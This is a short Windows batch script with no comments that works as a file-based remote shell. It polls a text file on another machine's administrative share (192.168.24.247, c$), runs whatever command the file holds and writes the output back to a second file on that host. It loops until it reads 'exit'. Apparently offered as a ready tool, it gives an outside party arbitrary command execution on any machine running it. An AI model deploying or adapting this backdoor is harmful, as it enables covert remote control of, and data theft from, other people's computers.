@echo off
set "PCNAME=%COMPUTERNAME%"
set "FILE_A=\\192.168.24.247\c$\Users\NativT\Documents\%PCNAME%A.txt"
set "FILE_B=\\192.168.24.247\c$\Users\NativT\Documents\%PCNAME%B.txt"
:loop
if not exist "%FILE_A%" (
    timeout /t 1 /nobreak >nul
    goto loop
)
set /p cmd=<"%FILE_A%"
if /i "%cmd%"=="exit" (
    del "%FILE_A%"
    goto end
)
cmd /c "%cmd%" > "%FILE_B%" 2>&1
del "%FILE_A%"
goto loop
:end
